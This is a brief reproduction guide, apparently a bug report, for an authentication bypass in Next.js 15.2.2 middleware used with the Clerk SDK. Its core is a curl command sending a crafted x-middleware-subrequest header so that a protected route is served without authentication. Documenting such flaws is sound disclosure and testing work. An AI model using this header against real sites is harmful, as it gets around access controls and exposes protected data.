# Steps to reproduce the auth bypass:

1. Mak sure to use a vulnerable version of next. In my case, it's 15.2.2
2. Install the Clerk SDK and set it up through an auth middleware
3. Stage the Payload using curl or an HTTP client
   ```bash
   curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" http://localhost:3000/secret
   ```
5. Send the request to the server
6. The server will respond with the protected page without throwing an error

# Screen recoding
https://cln.sh/XPy3ZQHm
